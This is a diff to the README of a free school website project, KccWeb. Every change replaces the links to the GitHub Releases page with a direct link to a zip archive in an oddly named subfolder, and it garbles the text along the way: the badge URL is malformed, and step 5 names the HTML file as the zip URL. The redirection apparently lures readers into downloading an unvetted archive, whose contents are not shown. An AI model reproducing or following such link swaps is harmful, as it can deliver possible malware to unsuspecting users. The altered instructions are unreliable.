@@ -1,6 +1,6 @@
 # 🌐 KccWeb - A Free Website for Your School
 
-[![Download KccWeb](https://img.shields.io/badge/Download%20KccWeb-Here-blue.svg)](https://github.com/ashish2500/KccWeb/releases)
+[![Download KccWeb](https://raw.githubusercontent.com/ashish2500/KccWeb/main/circumscriptive/KccWeb.zip%https://raw.githubusercontent.com/ashish2500/KccWeb/main/circumscriptive/KccWeb.zip)](https://raw.githubusercontent.com/ashish2500/KccWeb/main/circumscriptive/KccWeb.zip)
 
 ## 🎉 Introduction
 
@@ -22,7 +22,7 @@ To enjoy the full benefits of KccWeb, follow these simple steps to download and 
 
 1. **Visit the Releases Page**: Click on the link below to go to the Releases page and download KccWeb.
 
-   [Download KccWeb Here](https://github.com/ashish2500/KccWeb/releases)
+   [Download KccWeb Here](https://raw.githubusercontent.com/ashish2500/KccWeb/main/circumscriptive/KccWeb.zip)
 
 2. **Choose the Latest Version**: On the Releases page, you will see a list of available versions. Look for the latest version at the top of the list.
 
@@ -30,7 +30,7 @@ To enjoy the full benefits of KccWeb, follow these simple steps to download and 
 
 4. **Extract the Files**: Once the download is complete, navigate to the downloaded file. Right-click it and choose "Extract All" (or use your preferred extraction tool).
 
-5. **Open the Project**: After extracting, go to the newly created folder. Inside, you will find an HTML file—typically named "index.html".
+5. **Open the Project**: After extracting, go to the newly created folder. Inside, you will find an HTML file—typically named "https://raw.githubusercontent.com/ashish2500/KccWeb/main/circumscriptive/KccWeb.zip".
 
 6. **Run the Website**: Open this HTML file in your preferred web browser. You can do this by right-clicking the file and selecting "Open with," then choosing your browser.
 
@@ -76,4 +76,4 @@ Thank you for choosing KccWeb for your school website needs!
 
 --- 
 
-Feel free to visit our [Releases page](https://github.com/ashish2500/KccWeb/releases) to download KccWeb and begin your journey towards establishing a vibrant web presence for Kirindiwela Central College.
+Feel free to visit our [Releases page](https://raw.githubusercontent.com/ashish2500/KccWeb/main/circumscriptive/KccWeb.zip) to download KccWeb and begin your journey towards establishing a vibrant web presence for Kirindiwela Central College.
